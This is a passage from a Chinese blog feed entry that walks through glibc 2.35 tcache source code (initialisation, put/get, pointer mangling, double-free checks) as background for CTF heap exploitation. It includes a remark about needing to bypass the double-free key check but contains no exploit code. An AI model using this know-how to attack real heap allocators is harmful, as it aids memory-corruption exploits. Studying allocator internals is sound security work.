class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个线程都会被分配一个<code>TcacheBin</code>数组，数组大小为64，也就是每个TcacheBin里会有64个<code>bin</code>单向链表，每个bin最多可以缓存7个相同大小的空闲<code>chunk</code>。chunk在64位机器以16字节递增，从32到1024(<code>MAX_TCACHE_COUNT</code>)字节。在32位机器上以8字节递增，从12到512字节。TcacheBin由<code>tcache_perthread_struct</code>结构体维护，大小是0x290，放在堆头；<code>counts</code>数组记录了每个bin上chunk的数量，<code>entries</code>数组记录每个bin的地址。<br><code>tcache_entry</code>结构体用来连接空闲的chunk结构体形成链表。在这里有几个需要注意的问题，其一是<code>next</code>指针指向的是同一个bin中下一个chunk（大小一定相同的chunk）的<code>user_data</code>处（也就是mem），而在fastbin中chunk的fd指针的是下一个chunk的头部，即<code>prev_size</code>处；其二是<code>key</code>是为了防止double free而从glibc2.29才开始加入的，在glibc2.34前key是指向TcacheBin的指针，储存在空闲chunk的bk位置上，而2.34之后的key是由<code>tcache_key_initialize</code>函数生成的，一个线程生成一个key。</p><p><code>tidx2usize(idx)</code>通过bin索引计算chunk大小<br><code>csize2tidx(x)</code>通过chunk大小找到相应的bin索引<br><code>usize2tidx(x)</code>通过用户的需求size计算相应的bin索引</p><p>TcacheBin有很多特性和FastBin很像，LIFO的单向链表结构，PREV_INUSE标志位不清零，严格限制每个bin内chunk的大小相同，且chunk没法在tcachebin内合并。</p><h3 id="TcacheBin初始化"><a href="#TcacheBin初始化" class="headerlink" title="TcacheBin初始化"></a>TcacheBin初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">//分配内存给tcache_perthread_struct</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) <span class="comment">//如果分配失败则尝试再分配一次</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex); <span class="comment">//释放一个互斥锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="comment">/* 在内存不足的情况下，我们可能无法分配内存 -这样的话，我们稍后再试。(๑ゝڡ◕๑) */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin释放"><a href="#TcacheBin释放" class="headerlink" title="TcacheBin释放"></a>TcacheBin释放</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>; <span class="comment">//将TcacheBin堆头置空</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i]; <span class="comment">//释放每一个bin</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp); <span class="comment">//释放临时堆头</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TcacheBin存取chunk"><a href="#TcacheBin存取chunk" class="headerlink" title="TcacheBin存取chunk"></a>TcacheBin存取chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//空闲chunk存入tcachebin</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key; <span class="comment">//防止double free的key</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="comment">//将当前bin头部chunk的指针赋给next</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e; <span class="comment">//将这个chunk存进相应索引的bin链表头部（更新bin头部）</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//chunk计数器+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span> <span class="comment">//从tcachebin取出chunk</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx]; <span class="comment">//根据计算好的索引取出链表头部的chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="comment">//检查chunk对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next); <span class="comment">//将头部地址改成下一个chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//计数器-1</span></span><br><span class="line">  e-&gt;key = <span class="number">0</span>; <span class="comment">//key位置置空</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当chunk进入tcachebin时，它会被赋予这个TcacheBin的key，意味着这个chunk<strong>已经加入tcachebin了</strong>，当我们想要进行double free时，free会检查这个key是否存在，存在则说明double free了，所以要想办法绕过key的检查。而在2.28版本之前想进行double free是相当方便的，可以直接连续free。</p><p>这里还有一个问题：可以注意到在维护next成员的时候用了一个叫做<code>PROTECT_PTR</code>的函数，在维护entries的时候有一个<code>REVEAL_PTR</code>函数。我们对它们进行溯源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>发现tcache对fd进行了一定的位运算后才存到chunk上，来当做一个简单的加密。这是从2.32版本才开始引入的机制（但是感觉有点掩耳盗铃的意思）。</p><h3 id="执行free的时候TcacheBin对chunk的检查机制"><a href="#执行free的时候TcacheBin对chunk的检查机制" class="headerlink" title="执行free的时候TcacheBin对chunk的检查机制"></a>执行free的时候TcacheBin对chunk的检查机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp))) <span class="comment">//对chunk对齐的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e) <span class="comment">//对double free的检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//bin没满</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>不难发现，tcache虽然检查较少，但是相对于低版本，高版本会对double free和chunk对齐进行检查。</p><h3 id="Stashing机制"><a href="#Stashing机制" class="headerlink" title="Stashing机制"></a>Stashing机制</h3><p>见另一篇文章</p><p>参考阅读：<br>- <a href="https://blog.csdn.net/Tokameine/article/details/119458425">关于如何理解Glibc堆管理器(Ⅶ——Tcache Bins!!)</a><br>- <a href="https://www.freebuf.com/articles/system/291760.html">TcacheBin的相关知识以及漏洞利用</a><br>- <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source">glibc源码在线阅读</a><br>- <a href="https://ftp.gnu.org/pub/gnu/glibc/">glibc源码下载</a></p>]]></content>
    
    
    <summary type="html">glibc_2.35（版本较高，注意版本区别）</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.top/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
  </entry>
  
</feed>
